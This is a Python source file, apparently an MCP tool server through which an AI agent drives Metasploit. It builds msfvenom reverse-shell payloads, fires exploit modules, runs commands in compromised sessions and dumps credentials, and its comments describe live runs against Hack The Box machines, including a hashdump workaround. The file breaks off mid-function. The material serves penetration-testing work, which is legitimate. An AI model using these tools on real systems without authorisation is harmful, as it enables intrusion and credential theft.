        await asyncio.sleep(1)  # Give msfrpcd time to start processing

        while time.time() - start < timeout:
            res = await asyncio.to_thread(self.console.read)
            output += res["data"]

            if not res["busy"]:
                # If no output yet and it's very early, command may not have started
                if not output.strip() and time.time() - start < 5:
                    await asyncio.sleep(1)
                    continue
                break

            await asyncio.sleep(0.5)
        else:
            raise ToolError(
                message=f"Console command timed out after {timeout}s",
                details=output[:2000],
            )

        return output

    # ── Tool Methods ─────────────────────────────────────────────────────

    async def generate_payload(
        self,
        payload: str,
        lhost: str,
        lport: int,
        format: str = "raw",
        encoder: Optional[str] = None,
        iterations: int = 1,
    ) -> ToolResult:
        """Generate a payload using msfvenom (direct subprocess — stateless)."""
        self.logger.info(f"Generating payload: {payload}")

        if err := self._validate_arg("payload", payload): return err
        if err := self._validate_arg("lhost", lhost): return err
        if err := self._validate_arg("format", format): return err
        if encoder:
            if err := self._validate_arg("encoder", encoder): return err
        payload_name = self._resolve_payload(payload)

        with tempfile.NamedTemporaryFile(delete=False, suffix=f".{format}") as f:
            output_file = f.name

        try:
            args = [
                "msfvenom",
                "-p", payload_name,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", format,
                "-o", output_file,
            ]

            if encoder:
                args.extend(["-e", encoder, "-i", str(iterations)])

            self.logger.info(f"Running: msfvenom -p {payload_name} ...")
            result = await self.run_command_with_progress(args)

            # Read generated payload
            payload_data = None
            payload_bytes = b""
            if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                with open(output_file, "rb") as f:
                    payload_bytes = f.read()
                    payload_data = base64.b64encode(payload_bytes).decode("utf-8")

            # Detect msfvenom failure: returncode is the authoritative
            # signal, but fall back to "no bytes generated" since some
            # exit paths return 0 with empty output (msfvenom occasionally
            # prints errors then exits cleanly).
            returncode = getattr(result, "returncode", 0) or 0
            if returncode != 0 or not payload_bytes:
                combined = (result.stdout or "") + (result.stderr or "")
                err_lower = combined.lower()
                if "invalid payload" in err_lower or "no compatible payload" in err_lower:
                    err_class, suggestion = "invalid_parameter", \
                        "Payload name invalid. Use msfvenom --list payloads or search_modules type=payload."
                elif "invalid format" in err_lower:
                    err_class, suggestion = "invalid_parameter", \
                        "Format not supported. Valid formats: " + ", ".join(self.PAYLOAD_FORMATS)
                elif "encoder" in err_lower and ("not found" in err_lower or "failed" in err_lower):
                    err_class, suggestion = "invalid_parameter", \
                        "Encoder not found or failed. Try without encoder or use 'x86/shikata_ga_nai'."
                else:
                    err_class, suggestion = "tool_misconfigured", \
                        "msfvenom did not produce a payload — see raw_output for the specific reason."
                return ToolResult(
                    success=False,
                    data={"payload": payload_name, "format": format},
                    error=f"msfvenom failed (returncode={returncode}, bytes={len(payload_bytes)})",
                    error_class=err_class,
                    retryable=False,
                    suggestions=[suggestion],
                    raw_output=sanitize_output(combined),
                )

            return ToolResult(
                success=True,
                data={
                    "payload": payload_name,
                    "lhost": lhost,
                    "lport": lport,
                    "format": format,
                    "size_bytes": len(payload_bytes),
                    "payload_base64": payload_data,
                    "encoder": encoder,
                },
                raw_output=sanitize_output(result.stdout + result.stderr),
            )

        except ToolError as e:
            return mcp_error_to_result(self._classify_msf_error(str(e)) or MsfApiError(str(e)))
        finally:
            if os.path.exists(output_file):
                os.unlink(output_file)

    async def search_modules(
        self,
        query: str,
        type: str = "all",
        limit: int = InputValidator.LIMIT_DEFAULT,
        offset: int = 0,
    ) -> ToolResult:
        """Search Metasploit modules via the structured ``module.search`` RPC.

        Returns each match as a dict with ``type``, ``name``, ``fullname``,
        ``rank``, ``disclosure_date``, ``check`` (whether the module
        implements a check method). No console parsing — the RPC returns
        already-typed records. Supports pagination via ``limit`` / ``offset``.
        """
        self.logger.info(f"Searching modules: {query}")
        if err := self._validate_arg("query", query): return err
        try:
            InputValidator.validate_pagination(limit, offset)
        except ValidationError as e:
            return mcp_error_to_result(e)

        # msfconsole filter syntax piggy-backs on the same search query
        # (e.g. ``type:exploit eternalblue``). We forward verbatim.
        match = f"type:{type} {query}" if type != "all" else query

        try:
            await self._ensure_connected()
            modules = await asyncio.to_thread(self.client.modules.search, match)
            page, meta = paginate(modules, limit, offset)
            return ToolResult(
                success=True,
                data={
                    "query": query,
                    "type": type,
                    "modules": page,
                    "count": len(page),
                    **meta,
                },
            )
        except Exception as e:
            return self._msf_error("search_modules", e)

    async def check_vuln(
        self,
        module: str,
        rhosts: str,
        options: Optional[Dict[str, Any]] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Check if a target is vulnerable.

        Uses ``check`` for exploit modules (probes without firing the
        payload) and ``run`` for auxiliary scanners (which already run as
        check-only scans). Calling ``run`` on an exploit module would FIRE
        the exploit — we hit this live: ``check_vuln`` against
        ms17_010_eternalblue actually triggered ETERNALBLUE on Blue and
        timed out the console waiting for the second-stage handler.
        """
        self.logger.info(f"Checking vulnerability with {module} against {rhosts}")
        if err := self._validate_arg("module", module): return err
        if err := self._validate_arg("rhosts", rhosts): return err
        if err := self._validate_options(options): return err

        if module.startswith("exploit/"):
            verb = "check"
        elif module.startswith("auxiliary/"):
            verb = "run"
        else:
            verb = "check"

        cmds = [
            f"use {module}",
            f"set RHOSTS {rhosts}",
        ]

        if options:
            for key, value in options.items():
                cmds.append(f"set {key} {value}")

        cmds.append(verb)

        try:
            output = await self._console_exec("\n".join(cmds), timeout=timeout)

            output_lower = output.lower()

            # Detect target-unreachable / scan-failed cases first — these
            # should NOT return vulnerable=False (which implies "scan ran,
            # target is safe"). Distinguish "couldn't reach target" from
            # "scanned target, target is not vulnerable".
            unreachable_markers = [
                "rex::connectiontimeout",
                "rex::connectionrefused",
                "rex::hostunreachable",
                "no response from target",
                "host is down",
                "could not connect",
            ]
            unreachable = any(m in output_lower for m in unreachable_markers)
            if unreachable:
                return ToolResult(
                    success=False,
                    data={
                        "module": module,
                        "target": rhosts,
                        "vulnerable": None,  # truly unknown
                    },
                    error="Target unreachable — scan could not complete",
                    error_class="network",
                    retryable=True,
                    suggestions=[
                        "Verify the target IP and reachability (ping/nmap)",
                        "Check VPN connectivity if scanning HTB targets",
                    ],
                    raw_output=sanitize_output(output),
                )

            # Detect option-validation errors (RHOSTS not set, required option missing, etc.)
            if "msf::optionvalidateerror" in output_lower or "the following options failed to validate" in output_lower:
                return ToolResult(
                    success=False,
                    data={"module": module, "target": rhosts},
                    error="Module option validation failed",
                    error_class="invalid_parameter",
                    retryable=False,
                    suggestions=[
                        "Run module_info to see required options",
                        "Pass missing options via the `options` dict",
                    ],
                    raw_output=sanitize_output(output),
                )

            # Now the normal vuln-detection logic
            negated = (
                "not appear vulnerable" in output_lower
                or "not vulnerable" in output_lower
                or "does not appear" in output_lower
            )
            positive = (
                "is vulnerable" in output_lower
                or "likely vulnerable" in output_lower
            )
            has_plus_vuln = any(
                line.startswith("[+]") and "vulnerable" in line.lower()
                for line in output.split("\n")
            )
            vulnerable = has_plus_vuln or positive or (
                "vulnerable" in output_lower and not negated
            )

            return ToolResult(
                success=True,
                data={
                    "module": module,
                    "target": rhosts,
                    "vulnerable": vulnerable,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return mcp_error_to_result(self._classify_msf_error(str(e)) or MsfApiError(str(e)))

    async def run_exploit(
        self,
        module: str,
        rhosts: str,
        payload: Optional[str] = None,
        lhost: Optional[str] = None,
        lport: Optional[int] = None,
        options: Optional[Dict[str, Any]] = None,
        timeout: int = 300,
        disable_payload_handler: bool = False,
        session_wait_seconds: int = 30,
    ) -> ToolResult:
        """Run an exploit via the structured ``module.execute`` RPC.

        Replaces the prior console-driven implementation. Workflow:
          1. Load the module: ``client.modules.use("exploit", path)`` —
             raises ``MsfRpcError`` for bad paths instead of silently
             leaving the prior module loaded.
          2. Set runopts (RHOSTS / LHOST / LPORT / options) via the
             module's ``__setitem__`` — invalid option names raise
             ``KeyError``, which we map to ``ValidationError``.
          3. ``module.execute(payload=...)`` queues the exploit as a
             background job and returns ``{"job_id": N, "uuid": "..."}``.
             Pymetasploit3 also rejects payloads incompatible with the
             selected target by raising ``ValueError`` upfront.
          4. Poll ``client.sessions.list`` (NOT console output) for a new
             session matching this exploit's job. The old
             "[*] Exploit completed" early-return is gone — that string
             only meant the job was queued, not that the exploit ran.

        Success criterion: a new session appears within
        ``session_wait_seconds``. No string-matching on console output.
        """
        self.logger.info(
            f"Running exploit {module} against {rhosts} "
            f"(disable_payload_handler={disable_payload_handler}, "
            f"session_wait_seconds={session_wait_seconds})"
        )
        if err := self._validate_arg("module", module): return err
        if err := self._validate_arg("rhosts", rhosts): return err
        if payload:
            if err := self._validate_arg("payload", payload): return err
        if lhost:
            if err := self._validate_arg("lhost", lhost): return err
        if err := self._validate_options(options): return err

        if "/" not in module:
            return mcp_error_to_result(ValidationError(
                f"Module path must include type prefix (e.g. exploit/...): {module}",
                suggestions=["Use search_modules to find a fully-qualified path"],
            ))
        mtype, _, mname = module.partition("/")
        if mtype != "exploit":
            return mcp_error_to_result(ValidationError(
                f"run_exploit only loads exploit modules, got type: {mtype}",
                suggestions=[
                    "For auxiliary modules use check_vuln (which calls run on auxiliary)",
                    "For post-exploitation modules use post_module",
                ],
            ))

        resolved_payload = self._resolve_payload(payload) if payload else None

        try:
            await self._ensure_connected()

            def _launch():
                # Snapshot session IDs BEFORE the job queues so we can
                # detect what's new afterwards.
                before = set(self.client.sessions.list.keys())

                m = self.client.modules.use("exploit", mname)
                m["RHOSTS"] = rhosts
                if lhost:
                    m["LHOST"] = lhost
                if lport:
                    m["LPORT"] = lport
                if disable_payload_handler:
                    m["DisablePayloadHandler"] = True
                if options:
                    for k, v in options.items():
                        m[k] = v

                exec_kwargs = {"payload": resolved_payload} if resolved_payload else {}
                exec_result = m.execute(**exec_kwargs)
                return before, exec_result

            try:
                before, exec_result = await asyncio.to_thread(_launch)
            except KeyError as e:
                # Bad option name from `m[bad_key] = value`.
                return mcp_error_to_result(ValidationError(
                    f"Unknown module option: {e}",
                    suggestions=["Use module_info to list valid options for this module"],
                ))
            except ValueError as e:
                # Payload incompatible with target.
                return mcp_error_to_result(ValidationError(
                    str(e),
                    suggestions=["Use module_info to see compatible payloads"],
                ))

            job_id = exec_result.get("job_id") if isinstance(exec_result, dict) else None
            uuid = exec_result.get("uuid") if isinstance(exec_result, dict) else None

            # Poll for new sessions every 2s until session_wait_seconds.
            poll_interval = 2.0
            polls = max(1, int(session_wait_seconds / poll_interval))
            new_session_ids: set = set()
            for poll in range(polls):
                await asyncio.sleep(poll_interval)
                after = set(self.client.sessions.list.keys())
                new_session_ids = after - before
                if new_session_ids:
                    self.logger.info(
                        f"Session(s) {new_session_ids} appeared after "
                        f"{(poll + 1) * poll_interval:.1f}s"
                    )
                    break

            after_sessions = self.client.sessions.list
            sessions = []
            for sid in sorted(new_session_ids, key=int):
                s = after_sessions[sid]
                sessions.append({
                    "id": int(sid),
                    "type": s.get("type", "unknown"),
                    "info": s.get("info", ""),
                    "via_exploit": s.get("via_exploit", ""),
                    "tunnel_peer": s.get("tunnel_peer", ""),
                })

            return ToolResult(
                success=True,
                data={
                    "module": module,
                    "target": rhosts,
                    "exploit_success": bool(sessions),
                    "sessions": sessions,
                    "session_count": len(sessions),
                    "disable_payload_handler": disable_payload_handler,
                    "session_wait_seconds": session_wait_seconds,
                    "job_id": job_id,
                    "uuid": uuid,
                },
            )

        except Exception as e:
            return self._msf_error("run_exploit", e)

    async def exec_command(
        self,
        module: str,
        rhosts: str,
        command: str,
        options: Optional[Dict[str, Any]] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Execute a command on target using an exploit with cmd payload."""
        self.logger.info(f"Executing command via {module} on {rhosts}: {command}")
        if err := self._validate_arg("module", module): return err
        if err := self._validate_arg("rhosts", rhosts): return err
        if err := self._validate_arg("command", command): return err
        if err := self._validate_options(options): return err

        cmds = [
            f"use {module}",
            f"set RHOSTS {rhosts}",
            "set PAYLOAD cmd/unix/generic",
            f"set CMD {command}",
        ]

        if options:
            for key, value in options.items():
                cmds.append(f"set {key} {value}")

        cmds.append("run")

        try:
            output = await self._console_exec("\n".join(cmds), timeout=timeout)

            # Parse the output to extract command results
            command_output = ""
            exploit_success = False

            if "exploit completed" in output.lower() or "command executed" in output.lower():
                exploit_success = True

            # Extract command output from the console output
            lines = output.split("\n")
            capture = False
            for line in lines:
                if line.startswith("[*]") or line.startswith("[+]") or line.startswith("[-]"):
                    if "executing" in line.lower() or "command" in line.lower():
                        capture = True
                        exploit_success = True
                    continue
                if capture and line.strip():
                    command_output += line + "\n"

            return ToolResult(
                success=True,
                data={
                    "module": module,
                    "target": rhosts,
                    "command": command,
                    "exploit_success": exploit_success,
                    "command_output": command_output.strip() if command_output else None,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return mcp_error_to_result(self._classify_msf_error(str(e)) or MsfApiError(str(e)))

    async def list_sessions(
        self,
        timeout: int = 30,
        limit: int = InputValidator.LIMIT_DEFAULT,
        offset: int = 0,
    ) -> ToolResult:
        """List active Meterpreter/shell sessions from msfrpcd."""
        self.logger.info("Listing active sessions")
        try:
            InputValidator.validate_pagination(limit, offset)
        except ValidationError as e:
            return mcp_error_to_result(e)

        try:
            await self._ensure_connected()

            sessions_dict = self.client.sessions.list
            sessions = []
            for sid, info in sessions_dict.items():
                sessions.append({
                    "id": int(sid),
                    "type": info.get("type", "unknown"),
                    "info": info.get("info", ""),
                    "tunnel_local": info.get("tunnel_local", ""),
                    "tunnel_peer": info.get("tunnel_peer", ""),
                    "via_exploit": info.get("via_exploit", ""),
                    "via_payload": info.get("via_payload", ""),
                    "platform": info.get("platform", ""),
                    "arch": info.get("arch", ""),
                })

            page, meta = paginate(sessions, limit, offset)
            return ToolResult(
                success=True,
                data={
                    "sessions": page,
                    "count": len(page),
                    **meta,
                },
            )

        except ToolError as e:
            return mcp_error_to_result(self._classify_msf_error(str(e)) or MsfApiError(str(e)))

    # Single tunable: how often to read the session buffer. Not load-bearing —
    # affects responsiveness, not correctness. 0.1s gives sub-second perceived
    # latency; could be 0.05 or 1.0 with no behavior change.
    _SESSION_POLL_INTERVAL_S = float(os.environ.get("MSF_SESSION_POLL_S", "0.1"))

    @staticmethod
    def _read_chunk(session) -> str:
        """Single read from a session, normalized to str (handles dict variants)."""
        chunk = session.read()
        if isinstance(chunk, dict):
            chunk = chunk.get("data", "")
        return chunk or ""

    def _shell_collect(self, session, command: str, timeout: int) -> str:
        """Run a command in a shell session via sentinel injection.

        The shell evaluates `cmd; echo MARKER` strictly serially, so MARKER
        appears AFTER cmd's full output. Read until MARKER (done) or
        timeout (partial). No timing thresholds — timeout is the contract.

        Why this works: shell semicolon sequencing is a hard guarantee.
        Standard pattern from pexpect/paramiko/expect dating to the 1990s.
        """
        marker = f"__MSF_END_{secrets.token_hex(8)}__"
        # Drain residual quickly (one read — anything stale gets dropped here)
        session.read()
        session.write(f"{command}; echo {marker}\n")

        output = ""
        deadline = time.time() + timeout
        while time.time() < deadline:
            output += self._read_chunk(session)
            if marker in output:
                # Strip from marker onward (and the preceding "; echo MARKER" echo)
                idx = output.find(marker)
                # The echo command itself is also in the buffer; locate its line
                line_start = output.rfind("\n", 0, idx)
                if line_start == -1:
                    line_start = idx
                return output[:line_start].rstrip()
            time.sleep(self._SESSION_POLL_INTERVAL_S)
        return output  # timeout — return what we have (may be partial)

    def _meterpreter_collect(self, session, command: str, timeout: int) -> str:
        """Run a command in a meterpreter session.

        Meterpreter does NOT serialize commands (sysinfo + getuid in
        sequence: getuid often completes first), so sentinel-after-cmd is
        unreliable. The contract: wait the agent's `timeout`, accumulate
        all output that arrives in that budget, return.

        The agent picks `timeout` based on the command (10s for pwd/getuid,
        60s for sysinfo, 300s for ps/hashdump). Wrong timeout = partial
        output — explicit, no tuning.
        """
        # Drain residual (single read — captures anything still trickling
        # from a prior call's command since meterpreter doesn't serialize)
        session.read()
        session.write(command)

        output = ""
        deadline = time.time() + timeout
        while time.time() < deadline:
            output += self._read_chunk(session)
            time.sleep(self._SESSION_POLL_INTERVAL_S)
        return output

    async def session_command(
        self,
        session_id: int,
        command: str,
        timeout: int = 60,
    ) -> ToolResult:
        """Run a command in an active session via msfrpcd.

        Shell sessions: sentinel-injected (returns when sentinel appears).
        Meterpreter sessions: wait the full timeout (no general way to
        detect command completion since meterpreter doesn't serialize).
        """
        self.logger.info(f"Running command in session {session_id}: {command}")
        if err := self._validate_arg("command", command): return err

        try:
            async with self._op_lock:
                await self._ensure_connected()

                # Verify session exists (handle both int and str keys from msgpack)
                sessions = self.client.sessions.list
                session_info = sessions.get(str(session_id)) or sessions.get(session_id)
                if session_info is None:
                    available = [int(k) for k in sessions.keys()]
                    return ToolResult(
                        success=False,
                        data={"session_id": session_id, "active_sessions": available},
                        error=f"Session {session_id} not found. Active sessions: {available}",
                        error_class="invalid_parameter" if not available else "session_lost",
                        retryable=False,
                        suggestions=[
                            "Run list_sessions to enumerate active sessions",
                            "Re-exploit the target if the session is gone",
                        ],
                    )
                session_type = session_info.get("type", "shell")

                # Bypass pymetasploit3's session() which makes a redundant RPC
                # call that can fail due to int/str key mismatch in msgpack
                if session_type == "meterpreter":
                    session = MeterpreterSession(session_id, self.client, session_info)
                else:
                    session = ShellSession(session_id, self.client, session_info)

                if session_type == "meterpreter":
                    # Meterpreter strategy: wait the agent's `timeout`.
                    #
                    # WHY no sentinel: meterpreter does NOT serialize
                    # commands. If we write user_cmd then a marker-cmd,
                    # the marker can finish FIRST (verified live: sysinfo
                    # took 10+s, getuid finished in <1s, "Server
                    # username:" appeared before sysinfo's chunks).
                    #
                    # WHY no empty-streak threshold: every threshold I
                    # tried (1.5s..10s) was wrong for some network class.
                    # On Lame's slow link, inter-chunk gaps in a single
                    # command reach 6+s, so any threshold below the gap
                    # causes premature breaks.
                    #
                    # The contract: agent passes `timeout`. We accumulate
                    # all output that arrives within that budget and
                    # return. No tuning. No magic numbers. The agent
                    # picks the budget based on the command (timeout=10
                    # for pwd/getuid, timeout=60 for sysinfo, timeout=300
                    # for ps/hashdump). If they pick wrong, they get
                    # partial output — clearly correct as a contract.
                    output = await asyncio.to_thread(
                        self._meterpreter_collect, session, command, timeout
                    )
                else:
                    # Shell strategy: sentinel injection.
                    #
                    # Shell sessions DO serialize via `;` — `cmd; echo MARKER`
                    # guarantees MARKER appears AFTER cmd completes. Read
                    # until marker (or timeout). Strip from marker onward.
                    output = await asyncio.to_thread(
                        self._shell_collect, session, command, timeout
                    )

                if isinstance(output, dict):
                    output = output.get("data", "")

                return ToolResult(
                    success=True,
                    data={
                        "session_id": session_id,
                        "command": command,
                        "output": output.strip() if isinstance(output, str) else str(output),
                    },
                )

        except ToolError as e:
            return mcp_error_to_result(self._classify_msf_error(str(e)) or MsfApiError(str(e)))
        except Exception as e:
            return ToolResult(
                success=False,
                data={},
                error=f"Session command failed: {e}",
            )

    async def post_module(
        self,
        module: str,
        session_id: int,
        options: Optional[Dict[str, Any]] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Run a post-exploitation module on a session via msfrpcd console.

        Known limitation (verified live on Blue, Win7 SP1, meterpreter):
        post modules that call ``create_credential`` —
        ``post/windows/gather/hashdump``, ``smart_hashdump``,
        ``post/multi/gather/credentials/*``, ``mimikatz_dynwrapx``, etc. —
        trigger an ActiveRecord ``Session can't be blank`` error during DB
        write because the session row isn't tracked in the framework's
        session table when sessions are created over msfrpcd. The dump
        halts before hashes reach the agent.

        Workaround: for credential extraction on a meterpreter session,
        call ``session_command(session_id, "hashdump")`` directly — that
        runs hashdump as a meterpreter built-in (no DB write, no AR
        path), and returns the full SAM dump as raw output. Verified
        against Blue: extracted Administrator/haris/Guest hashes cleanly.

        Non-credential post modules (enum_logged_on_users, enum_shares,
        gather/checkvm, gather/dumplinks, recon/*) run through this path
        without issue.
        """
        self.logger.info(f"Running post module {module} on session {session_id}")
        if err := self._validate_arg("module", module): return err
        if err := self._validate_options(options): return err

        cmds = [
            f"use {module}",
            f"set SESSION {session_id}",
        ]

        if options:
            for key, value in options.items():
                cmds.append(f"set {key} {value}")

        cmds.append("run")

        try:
            output = await self._console_exec("\n".join(cmds), timeout=timeout)

            output_lower = output.lower()
            ar_error = (
                "post failed:" in output_lower
                or "activerecord::recordinvalid" in output_lower
                or "session can't be blank" in output_lower
            )
            module_completed = "post module execution completed" in output_lower
            module_failed = (
                "[-] post failed" in output_lower
                or "module failed:" in output_lower
            )
            session_invalid = (
                "invalid session" in output_lower
                or "session id is not valid" in output_lower
                or "session id" in output_lower and "not valid" in output_lower
                or "no compatible sessions" in output_lower
                or "msf::optionvalidateerror" in output_lower
                or "the following options failed to validate" in output_lower
                or ("session" in output_lower and "is not currently a meterpreter session" in output_lower)
            )

            if session_invalid:
                return ToolResult(
                    success=False,
                    data={"module": module, "session_id": session_id},
                    error=f"Session {session_id} is not valid for this module",
                    error_class="invalid_parameter",
                    retryable=False,
                    suggestions=[
                        "Run list_sessions to enumerate active sessions and pick a valid id",
                        "Most post/windows/* modules require a meterpreter session, not a shell — convert with session_upgrade",
                    ],
                    raw_output=sanitize_output(output),
                )

            if ar_error:
                return ToolResult(
                    success=False,
                    data={"module": module, "session_id": session_id},
                    error=(
                        "post_module failed with ActiveRecord 'Session can't be "
                        "blank'. This is a known msfrpcd limitation for post "
                        "modules that call create_credential (hashdump, "
                        "smart_hashdump, post/multi/gather/credentials/*, "
                        "mimikatz_dynwrapx). Workaround: call "
                        "session_command(session_id, 'hashdump') for SAM dumps, "
                        "or use a non-credential-saving post module."
                    ),
                    error_class="tool_misconfigured",
                    retryable=False,
                    suggestions=[
                        "For SAM hashes use session_command(<sid>, 'hashdump') — meterpreter built-in, no DB write",
                        "Try a different post module that doesn't call create_credential",
                    ],
                    raw_output=sanitize_output(output),
                )

            if module_failed and not module_completed:
                typed = self._classify_msf_error(output)
                return ToolResult(
                    success=False,
                    data={"module": module, "session_id": session_id},
                    error="post module reported failure",
                    error_class=typed.error_class,
                    retryable=typed.retryable,
                    suggestions=typed.suggestions,
                    raw_output=sanitize_output(output),
                )

            return ToolResult(
                success=True,
                data={
                    "module": module,
                    "session_id": session_id,
                    "module_completed": module_completed,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return mcp_error_to_result(self._classify_msf_error(str(e)) or MsfApiError(str(e)))

    async def handler(
        self,
        payload: str,
        lhost: str,
        lport: int,
        timeout: int = 300,
        exit_on_session: bool = False,
    ) -> ToolResult:
        """Start a multi/handler to catch reverse shells. Handler persists in msfrpcd.

        ExitOnSession behavior:
          - exit_on_session=False (default): handler stays running for multiple
            sessions. Use when you expect more than one callback (mass payload
            delivery, persistence chains).
          - exit_on_session=True: handler exits after first session. Use for
            single-shot exploitation where you don't want lingering jobs.

        Renamed from start_handler() in May 2026 to match the MCP-registered
        name `handler` for consistency. Production trajectory showed the agent
        passing exit_on_session as a kwarg (silently dropped pre-fix); this
        version honors that intent.
        """
        self.logger.info(
            f"Starting handler for {payload} on {lhost}:{lport} "
            f"(exit_on_session={exit_on_session})"
        )
        if err := self._validate_arg("payload", payload): return err
        if err := self._validate_arg("lhost", lhost): return err

        payload_name = self._resolve_payload(payload)

        cmds = [
            "use exploit/multi/handler",
            f"set PAYLOAD {payload_name}",
            f"set LHOST {lhost}",
            f"set LPORT {lport}",
            f"set ExitOnSession {'true' if exit_on_session else 'false'}",
            "exploit -j",
        ]

        try:
            output = await self._console_exec("\n".join(cmds), timeout=30)

            # Extract job ID from output (e.g., "[*] Exploit running as background job 0.")
            job_id = None
            match = re.search(r"background job (\d+)", output)
            if match:
                job_id = match.group(1)

            # Pre-fix detection: regex on console output. That can race —
            # "[*] Started reverse TCP handler ..." sometimes lands AFTER
            # the synchronous return of `exploit -j`, so the substring
            # check missed real successes. Post-fix: poll jobs.list to
            # confirm the job is actually registered (skipped when the
            # client is unavailable, e.g., in unit-mock contexts that
            # patch _console_exec without a live msfrpcd).
            handler_started = False
            registered_job = None
            if job_id is not None and self.client is not None:
                for _ in range(5):
                    await asyncio.sleep(0.5)
                    try:
                        jobs = self.client.jobs.list
                    except Exception:
                        break
                    if str(job_id) in jobs or int(job_id) in jobs:
                        registered_job = jobs.get(str(job_id)) or jobs.get(int(job_id))
                        handler_started = True
                        break

            # Fallback signal — if jobs.list didn't register but the bind
            # text appeared and no failure marker, accept it.
            if not handler_started:
                output_lower = output.lower()
                bind_failed = (
                    "handler failed to bind" in output_lower
                    or "address is already in use" in output_lower
                )
                started_marker = (
                    "started reverse" in output_lower
                    or "started bind" in output_lower
                ) and "handler" in output_lower
                if started_marker and not bind_failed:
                    handler_started = True

            # If clearly failed, surface as error
            output_lower = output.lower()
            if "handler failed to bind" in output_lower or "address is already in use" in output_lower:
                typed = self._classify_msf_error(output)
                return ToolResult(
                    success=False,
                    data={"payload": payload_name, "lhost": lhost, "lport": lport},
                    error="handler failed to bind LPORT",
                    error_class=typed.error_class,
                    retryable=typed.retryable,
                    suggestions=typed.suggestions,
                    raw_output=sanitize_output(output),
                )

            return ToolResult(
                success=True,
                data={
                    "payload": payload_name,
                    "lhost": lhost,
                    "lport": lport,
                    "handler_started": handler_started,
                    "job_id": job_id,
                    "registered_job": registered_job,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return mcp_error_to_result(self._classify_msf_error(str(e)) or MsfApiError(str(e)))

    # ── May 2026 expansion: Wave 2-5 implementations ──────────────────────

    def _msf_error(self, name: str, e: Exception) -> ToolResult:
        """Convert any exception into a structured ToolResult.

        - McpError instances pass through with their attached metadata
          (error_class, retryable, suggestions).
        - Other exceptions (ToolError from upstream, generic Exception)
          go through ``_classify_msf_error`` to map their message text
          onto the typed hierarchy. If classification doesn't match any
          known pattern, falls back to MsfApiError (generic msf failure).

        Single point of conversion — replaces the ``error_class, retryable,
        suggestions = self._classify_msf_error(str(e))`` pattern that was
        repeated at ~15 call sites.
        """
        if isinstance(e, McpError):
            return mcp_error_to_result(e, method=name)
        typed = self._classify_msf_error(str(e)) or MsfApiError(str(e))
        return mcp_error_to_result(typed, method=name)

    async def list_jobs(
        self,
        limit: int = InputValidator.LIMIT_DEFAULT,
        offset: int = 0,
    ) -> ToolResult:
        """List active background jobs (jobs -l)."""
        self.logger.info("Listing jobs")
        try:
            InputValidator.validate_pagination(limit, offset)
        except ValidationError as e:
            return mcp_error_to_result(e)
        try:
            await self._ensure_connected()
            jobs_dict = self.client.jobs.list  # {jid: {name, ...}}
            jobs = [{"id": int(jid), **(info if isinstance(info, dict) else {"name": str(info)})}
                    for jid, info in jobs_dict.items()]
            page, meta = paginate(jobs, limit, offset)
            return ToolResult(
                success=True,
                data={"jobs": page, "count": len(page), **meta},
                raw_output=f"{len(jobs)} active jobs",
            )
        except Exception as e:
            return self._msf_error("list_jobs", e)

    async def stop_job(self, job_id: Optional[int] = None, all_jobs: bool = False) -> ToolResult:
        """Stop a job (jobs -k <id>) or all jobs (jobs -K).

        Verification: after issuing the kill, polls jobs.list to confirm
        the job is no longer registered. Returns ``stopped`` boolean so
        the agent knows whether the kill landed without re-querying.
        """
        self.logger.info(f"Stopping job (job_id={job_id}, all_jobs={all_jobs})")
        if job_id is None and not all_jobs:
            return ToolResult(
                success=False, data={},
                error="Either job_id or all_jobs=True is required",
                error_class="invalid_parameter", retryable=False,
            )
        try:
            await self._ensure_connected()
            if all_jobs:
                output = await self._console_exec("jobs -K", timeout=10)
                # Verify
                await asyncio.sleep(0.3)
                remaining = len(self.client.jobs.list)
                return ToolResult(
                    success=True,
                    data={"stopped_all": True, "remaining_jobs": remaining},
                    raw_output=sanitize_output(output),
                )
            else:
                output = await self._console_exec(f"jobs -k {job_id}", timeout=10)
                await asyncio.sleep(0.3)
                jobs_after = self.client.jobs.list
                still_present = (str(job_id) in jobs_after) or (int(job_id) in jobs_after)
                return ToolResult(
                    success=True,
                    data={
                        "stopped_job_id": job_id,
                        "stopped": not still_present,
                    },
                    raw_output=sanitize_output(output),
                )
        except Exception as e:
            return self._msf_error("stop_job", e)

    async def session_kill(self, session_id: Optional[int] = None, all_sessions: bool = False) -> ToolResult:
        """Kill a session (sessions -k <id>) or all sessions (sessions -K).

        Verification: msfrpcd's session reap is async — after sessions -k
        the session may linger in sessions.list for ~1s before being
        removed. Poll up to 3s to confirm and return the actual outcome.
        """
        self.logger.info(f"Killing session (session_id={session_id}, all_sessions={all_sessions})")
        if session_id is None and not all_sessions:
            return ToolResult(
                success=False, data={},
                error="Either session_id or all_sessions=True is required",
                error_class="invalid_parameter", retryable=False,
            )
        try:
            await self._ensure_connected()
            cmd = "sessions -K" if all_sessions else f"sessions -k {session_id}"
            output = await self._console_exec(cmd, timeout=15)

            # Verify the kill landed (msfrpcd's session reap is async)
            killed = False
            for _ in range(6):
                await asyncio.sleep(0.5)
                sessions_after = self.client.sessions.list
                if all_sessions:
                    if not sessions_after:
                        killed = True
                        break
                else:
                    still_present = (
                        str(session_id) in sessions_after
                        or int(session_id) in sessions_after
                    )
                    if not still_present:
                        killed = True
                        break
            return ToolResult(
                success=True,
                data={
                    "session_id": session_id,
                    "all_sessions": all_sessions,
                    "killed": killed,
                },
                raw_output=sanitize_output(output),
            )
        except Exception as e:
            return self._msf_error("session_kill", e)

    async def session_upgrade(self, session_id: int, lhost: Optional[str] = None,
                              lport: Optional[int] = None, timeout: int = 180) -> ToolResult:
        """Upgrade a shell session to meterpreter (sessions -u <id>).

        Internally runs post/multi/manage/shell_to_meterpreter. The new
        meterpreter session typically gets a NEW session ID; we poll up to
        ``timeout`` seconds for it and additionally probe ``getuid`` on
        the new session to confirm it's actually responsive (a registered-
        but-broken meterpreter would otherwise return upgrade_success=True
        and then fail on the agent's first call).
        """
        self.logger.info(f"Upgrading session {session_id} to meterpreter")
        if lhost:
            if err := self._validate_arg("lhost", lhost): return err
        try:
